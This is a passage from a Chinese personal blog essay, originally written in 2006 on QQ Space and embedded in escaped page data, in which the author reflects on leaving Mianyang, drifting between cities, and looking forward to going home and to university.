某种精神或者是某种执着。当然，我的再次漂泊不能毫无凭据地就说我已经没了那种精神或者是执着，我想环境会改变一个人的思想，并且完善它！</p>\n<p>这一次漂流大行动中，我为了给自己一个很好的理由，我说了，下一个城市一定更美，那里会拥有AS ROMA的火爆，也拥有酒吧的另类，并且又有着能美容的空气...有什么理由不离开这里去创造，去发掘，去适应一个新的城市呢？</p>\n<p>...我说了，我的离开对我来说不惨淡，而是对这里的一些朋友们来讲，我是不应该离开的！</p>\n<p>八月的时候，我又在期待明年的沿海，明年的华侨，明年的那所大学，我相信，命运总是公平的。</p>\n<hr>\n<p><em>写于2006年7月23日 17:14 QQ空间</em></p>\n<p><em>那些年轻时关于漂泊与归宿的思考</em></p>\n&quot;],&quot;data&quot;:[0,{&quot;author&quot;:[0,&quot;Xio&quot;],&quot;pubDatetime&quot;:[3,&quot;2006-07-23T09:14:00.000Z&quot;],&quot;title&quot;:[0,&quot;我在7月的最惨淡时刻&quot;],&quot;featured&quot;:[0,false],&quot;draft&quot;:[0,false],&quot;tags&quot;:[1,[[0,&quot;生活感悟&quot;],[0,&quot;漂泊&quot;],[0,&quot;绵阳&quot;],[0,&quot;青春&quot;],[0,&quot;思考&quot;]]],&quot;description&quot;:[0,&quot;<p>秋天还没到来，我却又要飘了，然而，此时此刻却再没有黄叶做伴....</p>\n<p>绵阳是一个不大不小的城市，拥有形形色色其他城市不能攀比的韵味。可是我却并不留恋在一个固定的地方，比如这个城市。当然，除了我在绝望时会怀念归宿，我就绝不会有其他例外了。我不知道什么东西才能抵制住我飘的欲望，也许，根本就不会有什么东西来抑制我的思想，又或许我本来就注定是漂浮不定的...</p>\n<p>明天，我就要踏上回家的列车回到我久违的故乡，我知道那里现在一定是绿树成荫，花开正好，温度适宜清爽的美好季节。我明白，在那样的空间里面会让我忘记很多不想纪念的事情，我期待父亲叫我吃饭的声音，依然怀念我和老爸抢电脑玩的那激动场面，甚至是一起玩玩麻将也行，这都是令我神往的事情，当然这只是在一种特定场面下的幸福感觉！</p>\n<p>对于绵阳，我不知道我到底收获了什么，或者是收益了什么，
